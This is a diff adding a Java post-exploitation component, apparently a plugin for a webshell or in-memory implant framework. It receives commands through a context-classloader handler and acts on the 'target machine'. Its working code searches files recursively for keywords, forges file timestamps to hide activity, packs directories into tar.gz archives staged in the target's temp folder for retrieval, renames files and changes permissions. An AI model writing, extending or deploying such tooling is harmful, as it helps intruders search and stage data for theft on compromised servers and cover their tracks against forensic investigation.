@@ -1,0 +1,632 @@
+package org.leo.javacore.component;
+
+import java.io.*;
+import java.text.SimpleDateFormat;
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+import java.util.zip.GZIPOutputStream;
+
+/**
+ * 文件操作增强组件
+ *
+ * <p>提供五项增强能力：
+ * <ul>
+ *   <li>ACTION_GREP (1)  — 递归关键词搜索文件内容</li>
+ *   <li>ACTION_TOUCH (2) — 修改文件/目录时间戳</li>
+ *   <li>ACTION_PACK (3)  — 将目录打包为 tar.gz 并保存到目标机器临时路径</li>
+ *   <li>ACTION_RENAME (4) — 重命名文件或目录</li>
+ *   <li>ACTION_CHMOD (5) — 修改文件或目录权限</li>
+ * </ul>
+ *
+ * <p>尽量使用低版本 JDK 语法和 API，避免生成匿名内部类。
+ */
+public class FileEnhanceComponent implements Runnable {
+
+    private static final int ACTION_GREP   = 1;
+    private static final int ACTION_TOUCH  = 2;
+    private static final int ACTION_PACK   = 3;
+    private static final int ACTION_RENAME = 4;
+    private static final int ACTION_CHMOD  = 5;
+
+    private static final String[] BINARY_EXTENSIONS = {
+        ".class",".jar",".war",".ear",".zip",".tar",".gz",".bz2",".xz",
+        ".7z",".rar",".png",".jpg",".jpeg",".gif",".bmp",".ico",".svg",
+        ".mp3",".mp4",".avi",".mov",".mkv",".pdf",".doc",".docx",".xls",
+        ".xlsx",".ppt",".pptx",".exe",".dll",".so",".dylib",".bin",
+        ".dat",".db",".sqlite",".lock",".pid"
+    };
+
+    private HashMap<String, Object> params;
+    private HashMap<String, Object> results;
+    private String packSourceCanonical;
+    private String packDestinationCanonical;
+    private HashSet<String> packVisitedDirectories;
+
+    @Override
+    public void run() {
+        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
+        try {
+            params = (HashMap) h.invoke(null, null, null);
+            results = new HashMap();
+            invoke();
+        } catch (Throwable t) {
+            if (results == null) results = new HashMap();
+            setResult(500, t.getMessage());
+        }
+        if (results != null) {
+            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
+        }
+    }
+
+    public void invoke() throws Exception {
+        int action = getInt("action", -1);
+        switch (action) {
+            case ACTION_GREP:   doGrep();   break;
+            case ACTION_TOUCH:  doTouch();  break;
+            case ACTION_PACK:   doPack();   break;
+            case ACTION_RENAME: doRename(); break;
+            case ACTION_CHMOD:  doChmod();  break;
+            default:
+                setResult(400, "未知 action: " + action);
+        }
+    }
+
+    // ── GREP：递归内容搜索 ────────────────────────────────────────────────────
+
+    private void doGrep() throws Exception {
+        String rootPath  = getString("path");
+        String keyword   = getString("keyword");
+        boolean regex    = Boolean.TRUE.equals(params.get("regex"));
+        boolean ignoreCase = !Boolean.FALSE.equals(params.get("ignoreCase")); // 默认忽略大小写
+        int maxResults   = getInt("maxResults", 200);
+        int maxLineLen   = getInt("maxLineLen", 300);
+        String include   = getString("include"); // 文件名 glob，如 "*.java"
+
+        if (!requireValue(rootPath, "path")) return;
+        if (!requireValue(keyword, "keyword")) return;
+        if (maxResults < 1) maxResults = 1;
+        if (maxResults > 10000) maxResults = 10000;
+        if (maxLineLen < 1) maxLineLen = 1;
+        if (maxLineLen > 10000) maxLineLen = 10000;
+
+        File root = new File(rootPath);
+        if (!root.exists()) {
+            setResult(404, "路径不存在: " + rootPath); return;
+        }
+
+        Pattern pattern;
+        try {
+            String patternStr = regex ? keyword : Pattern.quote(keyword);
+            pattern = ignoreCase
+                ? Pattern.compile(patternStr, Pattern.CASE_INSENSITIVE)
+                : Pattern.compile(patternStr);
+        } catch (Exception e) {
+            setResult(400, "正则表达式无效: " + e.getMessage()); return;
+        }
+
+        List matches = new ArrayList();
+        int[] totalFiles = new int[] {0};
+        int[] scannedFiles = new int[] {0};
+        int[] remaining = new int[] {maxResults};
+
+        grepRecursive(root, compileGlob(include), pattern, maxLineLen, matches, totalFiles, scannedFiles, remaining, 0);
+
+        results.put("code", 200);
+        results.put("matches", matches);
+        results.put("matchCount", matches.size());
+        results.put("totalFiles", totalFiles[0]);
+        results.put("scannedFiles", scannedFiles[0]);
+        results.put("truncated", remaining[0] <= 0);
+    }
+
+    private void grepRecursive(File file, Pattern include, Pattern pattern, int maxLineLen,
+                               List matches, int[] totalFiles, int[] scannedFiles,
+                               int[] remaining, int depth) {
+        if (file == null || remaining[0] <= 0 || depth > 256) {
+            return;
+        }
+        if (file.isDirectory()) {
+            File[] children = file.listFiles();
+            if (children == null) {
+                return;
+            }
+            Arrays.sort(children);
+            for (int i = 0; i < children.length && remaining[0] > 0; i++) {
+                grepRecursive(children[i], include, pattern, maxLineLen, matches,
+                        totalFiles, scannedFiles, remaining, depth + 1);
+            }
+            return;
+        }
+
+        totalFiles[0]++;
+        if (include != null && !include.matcher(file.getName()).matches()) {
+            return;
+        }
+
+        String name = file.getName().toLowerCase();
+        if (isBinaryExtension(name)) {
+            return;
+        }
+
+        if (file.length() > 10L * 1024L * 1024L) {
+            return;
+        }
+
+        scannedFiles[0]++;
+        List lineHits = new ArrayList();
+        BufferedReader br = null;
+        try {
+            br = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
+            String line;
+            int lineNum = 0;
+            while ((line = br.readLine()) != null && remaining[0] > 0) {
+                lineNum++;
+                Matcher m = pattern.matcher(line);
+                if (m.find()) {
+                    Map hit = new HashMap();
+                    hit.put("line", String.valueOf(lineNum));
+                    String content = line.length() > maxLineLen
+                            ? line.substring(0, maxLineLen) + "..."
+                            : line;
+                    hit.put("content", content.trim());
+                    lineHits.add(hit);
+                    remaining[0]--;
+                }
+            }
+        } catch (Exception ignored) {
+        } finally {
+            closeQuietly(br);
+        }
+
+        if (!lineHits.isEmpty()) {
+            Map fileMatch = new HashMap();
+            fileMatch.put("path", file.getAbsolutePath());
+            fileMatch.put("hits", lineHits);
+            fileMatch.put("hitCount", Integer.valueOf(lineHits.size()));
+            matches.add(fileMatch);
+        }
+    }
+
+    private Pattern compileGlob(String glob) {
+        if (glob == null || glob.length() == 0 || "*".equals(glob)) {
+            return null;
+        }
+        StringBuffer regex = new StringBuffer();
+        for (int i = 0; i < glob.length(); i++) {
+            char ch = glob.charAt(i);
+            if (ch == '*') {
+                regex.append(".*");
+            } else if (ch == '?') {
+                regex.append('.');
+            } else {
+                if ("\\.[]{}()+-^$|".indexOf(ch) >= 0) {
+                    regex.append('\\');
+                }
+                regex.append(ch);
+            }
+        }
+        return Pattern.compile(regex.toString());
+    }
+
+    private boolean isBinaryExtension(String name) {
+        for (String extension : BINARY_EXTENSIONS) {
+            if (name.endsWith(extension)) return true;
+        }
+        return false;
+    }
+
+    // ── TOUCH：修改时间戳 ─────────────────────────────────────────────────────
+
+    private void doTouch() throws Exception {
+        String path      = getString("path");
+        String timeStr   = getString("time");   // yyyy-MM-dd HH:mm:ss 或 null（使用当前时间）
+        boolean recursive = Boolean.TRUE.equals(params.get("recursive"));
+
+        if (!requireValue(path, "path")) return;
+
+        File target = new File(path);
+        if (!target.exists()) {
+            setResult(404, "路径不存在: " + path); return;
+        }
+
+        long timestamp;
+        if (timeStr != null && !timeStr.isEmpty()) {
+            try {
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+                timestamp = sdf.parse(timeStr).getTime();
+            } catch (Exception e) {
+                setResult(400, "时间格式错误，请使用 yyyy-MM-dd HH:mm:ss");
+                return;
+            }
+        } else {
+            timestamp = System.currentTimeMillis();
+        }
+
+        int count;
+
+        if (recursive && target.isDirectory()) {
+            count = touchRecursive(target, timestamp, 0);
+        } else {
+            count = target.setLastModified(timestamp) ? 1 : 0;
+        }
+        if (count == 0) {
+            setResult(500, "时间戳修改失败");
+            return;
+        }
+
+        setResult(200, "时间戳修改成功");
+        results.put("modifiedCount", Integer.valueOf(count));
+        results.put("newTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp)));
+    }
+
+    private int touchRecursive(File file, long timestamp, int depth) {
+        int count = 0;
+        if (file == null || depth > 256 || isSymbolicLink(file)) {
+            return 0;
+        }
+        if (file.isDirectory()) {
+            File[] children = file.listFiles();
+            if (children != null) {
+                for (int i = 0; i < children.length; i++) {
+                    count += touchRecursive(children[i], timestamp, depth + 1);
+                }
+            }
+        }
+        return file.setLastModified(timestamp) ? count + 1 : count;
+    }
+
+    // ── PACK：打包目录为 tar.gz ───────────────────────────────────────────────
+
+    private void doPack() throws Exception {
+        String sourcePath = getString("path");
+        String destPath   = getString("destPath"); // 可选，不传则用系统临时目录
+
+        if (!requireValue(sourcePath, "path")) return;
+
+        File source = new File(sourcePath);
+        if (!source.exists()) {
+            setResult(404, "路径不存在: " + sourcePath); return;
+        }
+        source = source.getCanonicalFile();
+
+        // 确定输出路径
+        String archiveName = source.getName() + "_" + System.currentTimeMillis() + ".tar.gz";
+        File destFile;
+        if (destPath != null && !destPath.isEmpty()) {
+            destFile = new File(destPath, archiveName);
+        } else {
+            destFile = new File(System.getProperty("java.io.tmpdir"), archiveName);
+        }
+        File destDir = destFile.getParentFile();
+        if (destDir != null && !destDir.exists() && !destDir.mkdirs() && !destDir.isDirectory()) {
+            throw new IOException("无法创建目标目录: " + destDir.getAbsolutePath());
+        }
+        if (destDir != null && !destDir.isDirectory()) {
+            throw new IOException("目标路径不是目录: " + destDir.getAbsolutePath());
+        }
+        packSourceCanonical = source.getCanonicalPath();
+        packDestinationCanonical = destFile.getCanonicalPath();
+        packVisitedDirectories = new HashSet<String>();
+
+        // 写 tar.gz（纯 Java 实现，不依赖外部命令）
+        FileOutputStream fos = null;
+        GZIPOutputStream gzos = null;
+        boolean packed = false;
+        try {
+            fos = new FileOutputStream(destFile);
+            gzos = new GZIPOutputStream(fos);
+            File baseDir = source.getParentFile();
+            if (baseDir == null) baseDir = new File(".").getCanonicalFile();
+            writeTar(source, baseDir, gzos);
+            gzos.write(new byte[1024]);
+            gzos.finish();
+            packed = true;
+        } finally {
+            closeQuietly(gzos);
+            closeQuietly(fos);
+            if (!packed) destFile.delete();
+        }
+
+        setResult(200, "打包成功");
+        results.put("archivePath", destFile.getAbsolutePath());
+        results.put("archiveName", archiveName);
+        results.put("archiveSize", destFile.length());
+    }
+
+    /**
+     * 简单 tar 实现（POSIX ustar 格式）。
+     * 不依赖 Apache Commons Compress，兼容性更好。
+     */
+    private void writeTar(File file, File baseDir, OutputStream out) throws Exception {
+        String canonical = file.getCanonicalPath();
+        if (canonical.equals(packDestinationCanonical)) {
+            return;
+        }
+        if (!canonical.equals(packSourceCanonical)
+                && !canonical.startsWith(packSourceCanonical + File.separator)) {
+            return;
+        }
+        if (file.isDirectory()) {
+            if (!packVisitedDirectories.add(canonical)) return;
+            writeTarEntry(file, baseDir, out);
+            File[] children = file.listFiles();
+            if (children != null) {
+                Arrays.sort(children);
+                for (File child : children) {
+                    writeTar(child, baseDir, out);
+                }
+            }
+        } else {
+            writeTarEntry(file, baseDir, out);
+        }
+    }
+
+    private void writeTarEntry(File file, File baseDir, OutputStream out) throws Exception {
+        String entryName = baseDir.toURI().relativize(file.toURI()).getPath();
+        if (file.isDirectory() && !entryName.endsWith("/")) entryName += "/";
+
+        byte[] header = buildTarHeader(entryName, file);
+        out.write(header);
+
+        if (!file.isDirectory()) {
+            FileInputStream fis = null;
+            try {
+                fis = new FileInputStream(file);
+                byte[] buf = new byte[512];
+                int len;
+                long written = 0;
+                while ((len = fis.read(buf)) != -1) {
+                    out.write(buf, 0, len);
+                    written += len;
+                }
+                // 填充到 512 字节边界
+                long remainder = written % 512;
+                if (remainder != 0) {
+                    out.write(new byte[(int)(512 - remainder)]);
+                }
+            } finally {
+                closeQuietly(fis);
+            }
+        }
+    }
+
+    private byte[] buildTarHeader(String name, File file) throws Exception {
+        byte[] header = new byte[512];
+
+        writeTarName(header, name);
+
+        // mode (8 bytes)
+        fillOctal(header, 100, 8, file.isDirectory() ? 0755 : 0644);
+        // uid/gid (8 bytes each)
+        fillOctal(header, 108, 8, 0);
+        fillOctal(header, 116, 8, 0);
+        // size (12 bytes)
+        fillOctal(header, 124, 12, file.isDirectory() ? 0 : file.length());
+        // mtime (12 bytes)
+        fillOctal(header, 136, 12, file.lastModified() / 1000);
+        // checksum placeholder
+        Arrays.fill(header, 148, 156, (byte) ' ');
+        // typeflag
+        header[156] = (byte)(file.isDirectory() ? '5' : '0');
+        byte[] magic = "ustar\0".getBytes("UTF-8");
+        System.arraycopy(magic, 0, header, 257, magic.length);
+        header[263] = '0';
+        header[264] = '0';
+
+        // compute checksum
+        int checksum = 0;
+        for (int i = 0; i < header.length; i++) checksum += (header[i] & 0xFF);
+        fillOctal(header, 148, 7, checksum);
+        header[155] = ' ';
+
+        return header;
+    }
+
+    private void writeTarName(byte[] header, String name) throws Exception {
+        byte[] nameBytes = name.getBytes("UTF-8");
+        if (nameBytes.length <= 100) {
+            System.arraycopy(nameBytes, 0, header, 0, nameBytes.length);
+            return;
+        }
+        int slash = name.lastIndexOf('/');
+        while (slash > 0) {
+            String prefix = name.substring(0, slash);
+            String suffix = name.substring(slash + 1);
+            byte[] prefixBytes = prefix.getBytes("UTF-8");
+            byte[] suffixBytes = suffix.getBytes("UTF-8");
+            if (prefixBytes.length <= 155 && suffixBytes.length <= 100) {
+                System.arraycopy(suffixBytes, 0, header, 0, suffixBytes.length);
+                System.arraycopy(prefixBytes, 0, header, 345, prefixBytes.length);
+                return;
+            }
+            slash = name.lastIndexOf('/', slash - 1);
+        }
+        throw new IOException("TAR 条目路径过长: " + name);
+    }
+
+    private void fillOctal(byte[] buf, int offset, int len, long value) throws Exception {
+        String octal = Long.toOctalString(value);
+        byte[] bytes = octal.getBytes("UTF-8");
+        if (bytes.length > len - 1) {
+            throw new IOException("TAR 数值字段溢出: " + value);
+        }
+        Arrays.fill(buf, offset, offset + len - 1, (byte) '0');
+        int start = offset + (len - 1 - bytes.length);
+        System.arraycopy(bytes, 0, buf, start, bytes.length);
+        buf[offset + len - 1] = 0;
+    }
+
+    // ── RENAME：重命名 ────────────────────────────────────────────────────────
+
+    private void doRename() throws Exception {
+        String path    = getString("path");
+        String newName = getString("newName");
+
+        if (!requireValue(path, "path")) return;
+        if (!requireValue(newName, "newName")) return;
+        if (newName.contains("/") || newName.contains("\\") || newName.equals(".") || newName.equals("..")) {
+            setResult(400, "newName 包含非法字符"); return;
+        }
+
+        File src = new File(path);
+        if (!src.exists()) {
+            setResult(404, "文件不存在: " + path); return;
+        }
+
+        File dest = new File(src.getParentFile(), newName);
+        if (dest.exists()) {
+            setResult(409, "目标名称已存在: " + newName); return;
+        }
+
+        boolean ok = src.renameTo(dest);
+        if (!ok) {
+            setResult(500, "重命名失败"); return;
+        }
+
+        setResult(200, "重命名成功");
+        results.put("newPath", dest.getAbsolutePath());
+    }
+
+    // ── CHMOD：修改权限 ───────────────────────────────────────────────────────
+
+    private void doChmod() throws Exception {
+        String path      = getString("path");
+        String mode      = getString("mode");     // 如 "755" 或 "0755"
+        boolean recursive = Boolean.TRUE.equals(params.get("recursive"));
+
+        if (!requireValue(path, "path")) return;
+        if (!requireValue(mode, "mode")) return;
+        // 只允许 3-4 位八进制数字
+        int modeStart = 0;
+        while (modeStart < mode.length() - 1 && mode.charAt(modeStart) == '0') modeStart++;
+        String modeClean = mode.substring(modeStart);
+        if (!modeClean.matches("[0-7]{1,4}")) {
+            setResult(400, "mode 格式错误，需为八进制数字如 755"); return;
+        }
+
+        File target = new File(path);
+        if (!target.exists()) {
+            setResult(404, "路径不存在: " + path); return;
+        }
+
+        // 尝试使用系统 chmod 命令（Linux/macOS）
+        String[] cmd;
+        if (recursive && target.isDirectory()) {
+            cmd = new String[]{"chmod", "-R", modeClean, path};
+        } else {
+            cmd = new String[]{"chmod", modeClean, path};
+        }
+
+        Process proc = null;
+        int exitCode;
+        String errMsg = "";
+        try {
+            proc = Runtime.getRuntime().exec(cmd);
+            // 读取 stderr 防止缓冲区阻塞
+            InputStream errStream = proc.getErrorStream();
+            try {
+                byte[] errBuf = new byte[1024];
+                int n = errStream.read(errBuf);
+                if (n > 0) errMsg = new String(errBuf, 0, n, "UTF-8").trim();
+            } finally {
+                closeQuietly(errStream);
+            }
+            exitCode = proc.waitFor();
+        } catch (Exception e) {
+            // chmod 命令不可用（Windows），降级为 Java File API
+            exitCode = applyChmodJava(target, modeClean, recursive, 0) ? 0 : 1;
+        } finally {
+            if (proc != null) {
+                try { proc.destroy(); } catch (Exception ignored) {}
+            }
+        }
+
+        if (exitCode != 0) {
+            setResult(500, "权限修改失败" + (errMsg.isEmpty() ? "" : ": " + errMsg));
+            return;
+        }
+
+        setResult(200, "权限修改成功");
+        results.put("mode", modeClean);
+    }
+
+    /** 无系统 chmod 时仅使用精确的 POSIX 权限设置；旧 JVM/非 POSIX 文件系统明确失败。 */
+    private boolean applyChmodJava(File target, String mode, boolean recursive, int depth) {
+        if (target == null || depth > 256 || isSymbolicLink(target)) return false;
+        try {
+            int octal = Integer.parseInt(mode, 8);
+            if ((octal & ~0777) != 0) return false;
+            StringBuilder bits = new StringBuilder();
+            String labels = "rwxrwxrwx";
+            for (int i = 0; i < 9; i++) {
+                bits.append((octal & (1 << (8 - i))) != 0 ? labels.charAt(i) : '-');
+            }
+            // 反射保留 Java 6 字节码/API 基线，不把不支持的权限近似映射给所有用户。
+            Class pathType = Class.forName("java.nio.file.Path");
+            Class permissionsType = Class.forName("java.nio.file.attribute.PosixFilePermissions");
+            Object path = File.class.getMethod("toPath").invoke(target);
+            Object permissions = permissionsType.getMethod("fromString", String.class).invoke(null, bits.toString());
+            Class.forName("java.nio.file.Files").getMethod("setPosixFilePermissions", pathType, Set.class)
+                    .invoke(null, path, permissions);
+            boolean success = true;
+            if (recursive && target.isDirectory()) {
+                File[] children = target.listFiles();
+                if (children == null) return false;
+                for (int i = 0; i < children.length; i++) {
+                    if (!isSymbolicLink(children[i])) {
+                        success = applyChmodJava(children[i], mode, true, depth + 1) && success;
+                    }
+                }
+            }
+            return success;
+        } catch (Exception unsupported) {
+            return false;
+        }
+    }
+
+    private boolean isSymbolicLink(File file) {
+        try {
+            File parent = file.getParentFile();
+            File resolved = parent == null ? file : new File(parent.getCanonicalFile(), file.getName());
+            return !resolved.getCanonicalPath().equals(resolved.getAbsolutePath());
+        } catch (IOException error) {
+            return true;
+        }
+    }
+
+    // ── 工具方法 ──────────────────────────────────────────────────────────────
+
+    private String getString(String key) {
+        Object v = params.get(key);
+        if (v == null) return null;
+        if (v instanceof byte[]) {
+            try { return new String((byte[]) v, "UTF-8"); } catch (Exception ignored) {}
+        }
+        return String.valueOf(v);
+    }
+
+    private int getInt(String key, int def) {
+        Object v = params.get(key);
+        if (v == null) return def;
+        if (v instanceof Number) return ((Number) v).intValue();
+        try { return Integer.parseInt(getString(key).trim()); }
+        catch (NumberFormatException e) { return def; }
+    }
+
+    private boolean requireValue(String value, String name) {
+        if (value != null && !value.isEmpty()) return true;
+        setResult(400, name + " 不能为空");
+        return false;
+    }
+
+    private void setResult(int code, String message) {
+        results.put("code", Integer.valueOf(code));
+        results.put("msg", message);
+    }
+
+    private void closeQuietly(Closeable closeable) {
+        if (closeable == null) return;
+        try { closeable.close(); } catch (Exception ignored) {}
+    }
+}
